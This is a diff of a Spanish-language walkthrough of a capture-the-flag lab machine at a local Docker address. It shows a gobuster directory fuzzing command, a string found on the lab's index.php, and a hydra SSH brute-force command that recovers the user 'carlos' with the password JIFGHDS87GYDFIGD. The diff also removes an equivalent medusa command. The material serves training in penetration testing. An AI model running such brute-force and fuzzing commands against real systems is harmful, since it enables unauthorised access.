@@ -13,6 +13,7 @@ Discovered open port 22/tcp on 172.17.0.2
 Discovered open port 80/tcp on 172.17.0.2
 ```
 Como no tenemos ni usuario ni contraseña aun para atacar el puerto 22, vamos a probar poniendo la direccion IP en el navegador.
+
 Sin embargo, aparece la tipica pagina de Apache, por lo que vamos a empezar haciendo un poco de FUZZING WEB con "gobuster":
 ```
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,html -t 20
@@ -34,17 +35,14 @@ Finished
 ===============================================================
 ```
 Si nos fijamos, hay un "/index.php" y un "/index.html" lo cual es curioso, asi que vamos a probar con ambos a ver que nos encontramos.
+
 Con "/index.html" no hay nada interesante, ya que nos deja en la misma pagina que antes, pero con "/index.php", la cosa cambia ya que nos sale una cadena de caracteres:
 ```
 JIFGHDS87GYDFIGD
 ```
-Bien, probaremos entonces con fuerza bruta e HYDRA/MEDUSA para ver si podemos obtener el nombre de algun usuario, usando esta cadena de caracteres como "password":
+Bien, probaremos entonces con fuerza bruta e HYDRA y/o MEDUSA para ver si podemos obtener el nombre de algun usuario, usando esta cadena de caracteres como "password":
 ```
-HYDRA:
 hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2
-
-MEDUSA:
-medusa -h 172.17.0.2 -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD -M ssh
 ```
 Vemos que hay un usuario que se llama "carlos" y cuya contraseña es la que hemos puesto antes: "JIFGHDS87GYDFIGD"
 ```
